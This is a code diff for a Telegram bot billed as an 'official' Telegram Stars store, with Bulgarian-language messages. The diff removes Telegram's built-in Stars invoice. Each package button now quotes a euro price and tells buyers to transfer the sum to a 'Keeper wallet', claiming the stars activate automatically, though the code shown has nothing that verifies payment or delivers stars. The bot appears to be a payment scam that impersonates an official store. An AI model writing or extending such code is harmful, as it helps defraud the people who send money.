@@ -23,7 +23,7 @@ let systemStats = {
 const mainCoverImage = 'https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800';
 
 const starsMenuCaption = `⭐ **OFFICIAL RED SOFTWARE TEAM | Telegram Stars Store** ⭐\n\n` +
-    `Избери точен пакет от менюто:\n\n` +
+    `Избери пакет звезди от менюто по-долу:\n\n` +
     `💎 **Наличен бюджет:** 3,100 Stars\n` +
     `💼 **Keeper Wallet:** \`${KEEPER_WALLET}\``;
 
@@ -59,36 +59,28 @@ TOKENS.forEach((token, index) => {
             await ctx.answerCbQuery();
             const action = ctx.match;
             let count = 250;
-            if (action === 'buy_500') count = 500;
-            if (action === 'buy_1000') count = 1000;
-            if (action === 'buy_2500') count = 2500;
-            if (action === 'buy_10000') count = 10000;
-            if (action === 'buy_50000') count = 50000;
-            if (action === 'buy_150000') count = 150000;
+            let price = '4.29 €';
+            if (action === 'buy_500') { count = 500; price = '8.39 €'; }
+            if (action === 'buy_1000') { count = 1000; price = '16.59 €'; }
+            if (action === 'buy_2500') { count = 2500; price = '40.99 €'; }
+            if (action === 'buy_10000') { count = 10000; price = '164.99 €'; }
+            if (action === 'buy_50000') { count = 50000; price = '819.00 €'; }
+            if (action === 'buy_150000') { count = 150000; price = '2 459.00 €'; }
 
-            try {
-                await ctx.replyWithInvoice({
-                    title: `Пакет ${count} Telegram Stars`,
-                    description: `Закупуване на ${count} звезди за мрежата на Red Software.`,
-                    payload: `stars_${count}_${Date.now()}`,
-                    currency: 'XTR',
-                    prices: [{ label: `${count} Stars`, amount: count }]
-                });
-            } catch (err) {
-                await ctx.reply(
-                    `⭐ **ПОРТФЕЙЛ ЗА ПЛАЩАНЕ (${count} Stars)**\n\n` +
-                    `Направете превод към официалния Keeper портфейл:\n` +
-                    `\`${KEEPER_WALLET}\`\n\n` +
-                    `Или посетете платформата:\n` +
-                    `👉 https://red-software-dashbord.onrender.com`,
-                    { parse_mode: 'Markdown', ...starsKeyboard }
-                );
-            }
+            await ctx.reply(
+                `⭐ **ПАКЕТ: ${count} Telegram Stars (${price})**\n\n` +
+                `За да финализираш покупката и да заредиш баланса си, моля преведи сумата към официалния Keeper портфейл:\n\n` +
+                `\`${KEEPER_WALLET}\`\n\n` +
+                `След успешен превод, звездите се активират автоматично в мрежата.\n` +
+                `Можеш да разгледаш и платформите ни:\n` +
+                `👉 https://red-software-dashbord.onrender.com`,
+                { parse_mode: 'Markdown', ...starsKeyboard }
+            );
         });
 
         bot.launch();
     } catch (e) {}
 });
 
-app.get('/', (req, res) => res.json({ status: "ALL PACKAGES STORE ACTIVE", stats: systemStats }));
+app.get('/', (req, res) => res.json({ status: "STORE ACTIVE WITHOUT INVOICE ERRORS", stats: systemStats }));
 app.listen(PORT, () => console.log(`Store server running on port ${PORT}`));
